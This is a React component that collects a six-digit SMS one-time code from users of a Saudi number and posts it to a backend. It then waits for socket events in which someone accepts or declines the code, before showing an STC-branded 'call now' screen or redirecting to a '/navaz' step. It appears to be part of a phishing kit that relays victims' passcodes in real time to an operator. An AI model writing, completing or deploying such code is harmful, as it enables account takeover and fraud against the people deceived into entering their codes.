import React, { useEffect, useState } from "react";
import { api_route, socket } from "../App";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import { TfiHeadphoneAlt } from "react-icons/tfi";
import { useNavigate } from "react-router-dom";
import { useTranslation } from "../context/LanguageContext";

const MotslOtp = ({}) => {
  const { t, dir } = useTranslation();
  const [error, setError] = useState(null);
  const [otp, setOtp] = useState(null);
  const query = new URLSearchParams(window.location.search);
  const { id, network, phone } = JSON.parse(query.get("data"));
  const [counter, setCounter] = useState(60);
  const [load, setLoad] = useState(null);
  const [verfiy, setVrefiy] = useState(false);
  const navigate = useNavigate();
  useEffect(() => {
    const timer = setInterval(() => {
      if (counter > 0) {
        setCounter(counter - 1);
      } else {
        setCounter(60);
      }
    }, 1000);

    return () => clearInterval(timer);
  }, [counter]);

  const minutes = Math.floor(counter / 60);
  const seconds = counter % 60;

  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");

  const handleSubmit = async (e) => {
    setLoad(true);
    setError(false);

    e.preventDefault();
    const finalData = { ...JSON.parse(query.get("data")), otp };
    try {
      await axios.post(api_route + "/motslOtp/" + id, finalData).then(() => {
        socket.emit("motslOtp", { id, MotslOtp: otp, network });
      });
    } catch (error) {}
  };

  socket.on("acceptMotslOtp", (data) => {
    if (data.id === id) {
      if (network === "STC") {
        setVrefiy(true);
        setLoad(false);
        setCounter(60);
      } else return navigate(`/navaz?id=${id}&userOtp=${data.userOtp}`);
    }
  });
  socket.on("declineMotslOtp", (data) => {
    if (data === id) {
      setLoad(false);
      setVrefiy(false);
      setError(true);
    }
  });

  socket.on("acceptSTC", (data) => {
    console.log(data);
    if (data.id === id)
      return navigate(`/navaz?id=${data.id}&userOtp=${data.userOtp}`);
  });

  socket.on("declineSTC", (data) => {
    if (data === id) {
      setLoad(false);
      setVrefiy(false);
      setError(true);
    }
  });

  return (
    <div className="w-full flex flex-col justify-center items-center">
      {verfiy ? (
        <div
          className="fixed    z-50  w-full h-screen top-0 flex
           items-center justify-center "
          style={{ backgroundColor: "#f3f3f5" }}
        >
          <div className="flex w-11/12 md:w-1/2 bg-white rounded-md items-center justify-center gap-1 flex-col">
            <div className="flex w-full items-center justify-center gap-x-5">
              <img src="/stc.jpg" className=" min-w-10 w-1/3 " />{" "}
              <TfiHeadphoneAlt className=" h-7 w-7 text-gray-600" />
            </div>
            <div className="w-full text-black font-semibold text-3xl text-center">
              {t("motslOtp.stcCallNow")}
            </div>
            <div className="w-11/12 px-1 text-gray-500 font-semibold  text-center">
              {t("motslOtp.stcFollowSteps")}
            </div>
            <div
              className="font-semibold text-lg "
              style={{ color: "#aa35ff" }}
            >
              {t("motslOtp.pleaseWait")}
            </div>

            <div className="w-3/4 rounded-full py-2 flex items-center justify-center flex-col bg-purple-100  bg-opacity-60 my-3 border">
              <span
                style={{ color: "#aa35ff" }}
                className="text-lg font-semibold"
              >
                {t("motslOtp.recallAfter")}
              </span>
              <span
                style={{ color: "#aa35ff" }}
                className="text-lg  font-semibold"
              >
                {formattedMinutes} : {formattedSeconds}
              </span>
            </div>
          </div>
        </div>
      ) : (
        ""
      )}
      {load ? (
        <div className="flex top-0 z-50 w-full justify-center items-center h-screen fixed bg-white bg-opacity-60">
          <div className="bg-white rounded-md p-3 w-fit h-fit flex items-center justify-center gap-x-3">
            <TailSpin
              height="30"
              width="30"
              color="gray"
              ariaLabel="tail-spin-loading"
              radius="1"
              wrapperStyle={{}}
              wrapperClass=""
              visible={true}
            />
            <span className="text-lg">{t("common.processing")}</span>
            <img src="/logo.svg" className="w-14 h-14" />
          </div>
        </div>
      ) : (
        ""
      )}
      <form
        onSubmit={handleSubmit}
        className="w-full border rounded-md mx-1   py-5 px-2 shadow-md my-2 h-fit "
        dir={dir}
      >
        <span className="text-lg font-bold">{t("motslOtp.title")}</span>
        <div
          className="flex w-full items-center  gap-y-5 flex-col my-2    "
          dir={dir}
        >
          <span className="w-full text-right text-gray-700 text-base">
            {t("motslOtp.smsSent")}
          </span>
          <span className="w-full text-right text-gray-700 text-base">
            <span>{t("motslOtp.enterCodeSent")} </span>
            <span>+966 *********</span>
          </span>
        </div>

        <div className="flex flex-col gap-y-2 items-center ">
          <span className=" text-base w-full text-right  font-bold text-gray-600">
            {t("motslOtp.otpLabel")}
          </span>
          <input
            required
            type="text"
            minLength={6}
            maxLength={6}
            value={otp}
            inputMode="numeric"
            dir="ltr"
            onChange={(e) => setOtp(e.target.value)}
            placeholder="**********"
            className="p-2 border-2 text-left w-full rounded-md outline-blue-500"
          />
        </div>

        {error ? (
          <div className="w-full text-center text-red-500 text-xl">
            {t("common.invalidOtp")}
          </div>
        ) : (
          ""
        )}
        <div className="w-full flex justify-center items-center">
          <button
            className="text-white bg-[#146394] w-11/12 text-lg py-2  mt-5 rounded-md "
            type="submit"
          >
            {t("common.confirm")}
          </button>
        </div>
        <span className="w-full text-center text-gray-500 text-lg flex flex-col items-center justify-center pt-5">
          {t("motslOtp.codeSentWithinMinute")}
        </span>
      </form>
    </div>
  );
};

export default MotslOtp;
